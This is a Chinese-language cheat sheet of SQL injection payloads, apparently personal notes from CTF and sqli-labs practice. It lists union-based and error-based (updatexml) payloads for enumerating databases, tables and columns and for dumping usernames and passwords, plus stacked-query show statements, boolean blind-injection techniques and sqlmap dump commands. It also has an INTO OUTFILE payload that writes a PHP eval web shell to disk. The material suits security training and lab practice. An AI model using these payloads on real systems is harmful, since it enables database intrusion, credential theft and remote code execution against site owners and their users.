# SQL注入

## 联合查询

### 判断注入点

`?id=1'`

`?id=1"`

`?id=1')`

`?id=1' and '1'='2`

测试`'s"\`

### 爆列数

`?id=1' order by 1` 

### 查回显

`?id=-1' union select 1,2,3#`

### 爆库名

`?id=-3") union select 1,2,database()#`

### 爆表名

`?id=-3") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()`

### 爆字段名

`?id=-3") union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+`



可用`sys.schema_auto_increment_columns`代替`information_schema`

### 爆数据

`?id=-3") union select 1,2,group_concat(0x5c,username,0x5c,password)from users--+`

`') union select 1,group_concat(schema_name),3 from information_schema.schemata #`

## 报错查询

库名 

`?id=1 and updatexml(1,concat(0x5c,(select database())),1)--+`

表名

`?id=1 and updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=‘sqli’)),1)#`

列名

`?id=1 and updatexml(1,concat(’~’,(select group_concat(column_name) from information_schema.columns where table_name=‘flag’)),1)#`

内容

`?id=1 and updatexml(1,concat(’~’,(select group_concat(flag) from flag)),1)#`

## 修改表名

修改表名（将表明user改为users）：`alter table user rename to users;`

修改列名（将字段名username改为name）：`alter table users change uesrname name varchar(30);`

## show语句

`1';show database --+`

`1';show tables --+`

`1';show columns from 1919810931114514 --+`

## 文件写入

例：sqlilabs-less7

`loadfile`   `intofile`

`id=-1')) union select 1,"<?php @eval($_GET['cmd']); ?>",3 into outfile "D:\\phpStudy\\2.txt" --+`

## 盲注（布尔盲注/时间盲注）

#### 常用函数

**（1）length()**

length()函数主要返回字符串的长度，使用示例：
构造url：…/id =1’ and length(database())>1 --+
这句话的含义是判断当前数据库名称的长度是否大于1，大于1返回true，否则返回false
**（2）substr()和substring()**

substr()和substring()这两个函数功能一样，都是对字符串进行截片，具体用法为substr(字符串，起始位置，片段长度)（注意：起始位置从1开始计数），使用示例：
构造url：…/id =1’ and ascii(substr(database(),1,1))=97 --+
这句话的含义是判断当前数据库名称的第一个字符的ascii码是否等于97等于返回true，否则返回false
**（3）ascii()**

ascii()函数是将字符转换为ascii码，一定程度上可以让我们碰撞字符串名称的编程更容易实现，使用示例参考（2）
**（4）exists()**

exists()函数是判断查询结果是否为空，如果查询结果不为空返回true，查询结果为空返回false
构造url：…/id=1’ and exists(select table_name from information_schema.tables where table_schema=‘security’ limit 0,1)–+
这句话的含义是探查security数据库中是否存在表，以及通过limit语句探查表的数量

#### SQLMAP使用

爆库名

`python3 sqlmap.py -u "网址" -current-db`

爆表名：

`python3 sqlmap.py -u "网址" -D “库名” --tables`

爆列名：

`python3 sqlmap.py -u "网址" -D 库名 -T 表名 --columns`

查看字段：

`python3 sqlmap.py -u "网址" -D 库名 T 表明 -C 列名 --dump`

